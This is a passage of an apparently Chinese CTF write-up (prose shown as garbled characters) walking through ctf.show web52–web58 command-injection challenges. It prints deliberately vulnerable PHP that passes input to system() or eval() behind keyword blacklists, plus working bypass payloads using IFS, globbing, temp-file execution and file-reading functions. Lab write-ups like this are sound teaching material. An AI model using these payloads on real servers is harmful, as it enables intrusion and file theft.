class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|cat|flag| |[0-9]|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\>|\\&lt;/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" >/dev/null 2>&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>è¿‡æ»¤å¢åŠ äº† &lt;&gt;ï¼Œä½†æ˜¯æ²¡æœ‰ $ äº†ï¼Œç©ºæ ¼æ¢ä¸€ä¸‹èƒ½ç”¨çš„å°±è¡Œï¼Œflag ä¹Ÿæ¢åœ°æ–¹äº†</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">?c&#x3D;nl$&#123;IFS&#125;&#x2F;fla&#39;&#39;g||<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030144043709.png\" alt=\"image-20221030144043709\" /></p>\n<h2 id=\"web53\"><a class=\"anchor\" href=\"#web53\">#</a> web53</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"> <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|cat|flag| |[0-9]|\\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\>|\\&lt;/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$d</span> <span class=\"token operator\">=</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$d</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'no'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030150008909.png\" alt=\"image-20221030150008909\" /></p>\n<h2 id=\"web54\"><a class=\"anchor\" href=\"#web54\">#</a> web54</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\\`|\\%|\\x09|\\x26|\\>|\\&lt;/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">c&#x3D;&#x2F;bin&#x2F;c?t$&#123;IFS&#125;f???????<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030163705319.png\" alt=\"image-20221030163705319\" /></p>\n<h2 id=\"web55\"><a class=\"anchor\" href=\"#web55\">#</a> web55</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\>|\\&lt;/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>è¿‡æ»¤äº†å­—æ¯ï¼Œ%</p>\n<p>è¿™é‡Œå¯ä»¥åˆ©ç”¨ Linux çš„ä¸¤ä¸ªå°ç‰¹æ€§</p>\n<ol>\n<li>shell ä¸‹å¯ä»¥é€šè¿‡ &quot;.&quot; æ¥æ‰§è¡Œä»»æ„è„šæœ¬æ–‡ä»¶</li>\n<li>Linux ä¸‹æ–‡ä»¶åæ”¯æŒ glob é€šé…ç¬¦ä»£æ›¿</li>\n</ol>\n<p>ç”¨ &quot;.&quot; file æ‰§è¡Œæ–‡ä»¶æ˜¯ä¸éœ€è¦æ–‡ä»¶æœ‰æ‰§è¡Œæƒé™çš„ï¼Œé‚£ä¹ˆæ€ä¹ˆèƒ½å¾—åˆ°ä¸€ä¸ªå¯æ§æ–‡ä»¶å‘¢ï¼Œå¾ˆç®€å•ï¼Œä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶é€šè¿‡ä¸´æ—¶æ–‡ä»¶æ¥æ‰§è¡Œæ§åˆ¶æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶ä¼šä¿å­˜åˆ°ä¸´æ—¶æ–‡ä»¶ä¸‹ï¼Œé»˜è®¤æ˜¯ /tmp/phpxxxxxx å 6 ä½æ˜¯éšæœºçš„å­—æ¯ï¼Œæœ€åä¸€ä¸ªä¸€èˆ¬æ˜¯å¤§å†™</p>\n<p>ä½†æ˜¯è¿™ä¸ªé¢˜è¿‡æ»¤äº†å­—æ¯ï¼Œæ€ä¹ˆæŒ‡å‘æ–‡ä»¶å‘¢ï¼Œè¿™å°±ç”¨åˆ°ç¬¬äºŒä¸ªç‰¹æ€§é€šé…ç¬¦</p>\n<p>å…ˆå†™ä¸€ä¸ªç®€å•çš„ä¸Šä¼ è¡¨å•ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶</p>\n<p><pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>en<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>UTF-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>X-UA-Compatible<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>IE=edge<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>viewport<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>width=\\, initial-scale=1.0<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>Document<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\n<span class=\"token comment\">&lt;!-- // ä¸Šä¼ è¡¨å• --></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://84aea9a6-e0af-456f-93a2-9bec25124c84.challenge.ctf.show/<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>post<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">enctype</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>multipart/form-data<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>file<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>file<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>ä¸Šä¼ <span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>ç„¶åæ‰§è¡Œå‘½ä»¤</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030171950597.png\" alt=\"image-20221030171950597\" /></p>\n<h2 id=\"web56\"><a class=\"anchor\" href=\"#web56\">#</a> web56</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token comment\">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|[a-z]|[0-9]|\\\\$|\\(|\\&#123;|\\'|\\\"|\\`|\\%|\\x09|\\x26|\\>|\\&lt;/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031153720300.png\" alt=\"image-20221031153720300\" /></p>\n<p>æœ‰æ”¹åŠ¨ï¼Œä½†æ˜¯æ²¡å½±å“</p>\n<h2 id=\"web57\"><a class=\"anchor\" href=\"#web57\">#</a> web57</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">// è¿˜èƒ½ç‚«çš„åŠ¨å—ï¼Ÿ</span>\n<span class=\"token comment\">//flag in 36.php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|[a-z]|[0-9]|\\`|\\|\\#|\\'|\\\"|\\`|\\%|\\x09|\\x26|\\x0a|\\>|\\&lt;|\\.|\\,|\\?|\\*|\\-|\\=|\\[/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cat \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\".php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>è¿‡æ»¤äº†ä¸€å †ä¸œè¥¿ï¼Œæƒ³åŠæ³•æ„é€  36 å³å¯</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031155531713.png\" alt=\"image-20221031155531713\" /></p>\n<p>æ‰¾æ•°å­—ï¼Ÿè¿™ä¸å°±æœ‰äº†</p>\n<p><code>$(())</code>  ä»£è¡¨åšä¸€æ¬¡è¿ç®—ï¼Œå› ä¸ºé‡Œé¢ä¸ºç©ºï¼Œä¹Ÿè¡¨ç¤ºå€¼ä¸º 0<br />\n <code>$((~$(())))</code>  å¯¹ 0 ä½œå–åè¿ç®—ï¼Œå€¼ä¸º - 1</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031155740487.png\" alt=\"image-20221031155740487\" /></p>\n<p>æ¥ä¸‹æ¥å¼€å§‹æ„é€ å¯¹è¿™ä¸ªå–åè·å¾—æ­£æ•°</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031155858648.png\" alt=\"image-20221031155858648\" /></p>\n<p>é‚£ä¹ˆæ¥ä¸‹æ¥æ„é€ å‡º - 37ï¼Œç„¶åå–åå°±è¡Œ</p>\n<p><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">data <span class=\"token operator\">=</span> <span class=\"token string\">\"$((~$((\"</span><span class=\"token operator\">+</span><span class=\"token string\">\"$((~$(())))\"</span><span class=\"token operator\">*</span><span class=\"token number\">37</span><span class=\"token operator\">+</span><span class=\"token string\">\"))))\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~\n$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~\n$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~\n$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~\n$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~\n$(())))$((~$(())))$((~$(())))))))<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031160201680.png\" alt=\"image-20221031160201680\" /></p>\n<h2 id=\"web58\"><a class=\"anchor\" href=\"#web58\">#</a> web58</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$c</span><span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031161118971.png\" alt=\"image-20221031161118971\" /></p>\n<p>æˆ‘å¼€å§‹è¿˜åœ¨ç–‘æƒ‘æ€ä¹ˆæ²¡è¿‡æ»¤äº†ï¼ŒåŸæ¥æ˜¯å¼€å§‹ç¦ç”¨å‡½æ•°äº†ï¼Œç¦ç”¨äº† system å‡½æ•°ï¼Œå°è¯• scandirï¼Œå°†ç»“æœè¾“å‡º</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">c&#x3D;var_dump(scandir(&#39;.&#39;));\nc&#x3D;print_r(scandir(&#39;.&#39;));<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031162334817.png\" alt=\"image-20221031162334817\" /></p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">c<span class=\"token operator\">=</span><span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nc<span class=\"token operator\">=</span><span class=\"token function\">readfile</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nc<span class=\"token operator\">=</span><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">file</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nc<span class=\"token operator\">=</span><span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">file</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// è¯»æ–‡ä»¶</span>\n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>             \n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  \n<span class=\"token comment\">// é«˜äº®æ–‡ä»¶å†…å®¹</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031162659472.png\" alt=\"image-20221031162659472\" /></p>\n<p>è¡¥å……ï¼šä¸Šé¢çš„ file æ˜¯å°†æ–‡ä»¶å†…å®¹è¯»å…¥åˆ°ä¸€ä¸ªæ•°ç»„ä¸­</p>\n<h2 id=\"web59\"><a class=\"anchor\" href=\"#web59\">#</a> web59</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter 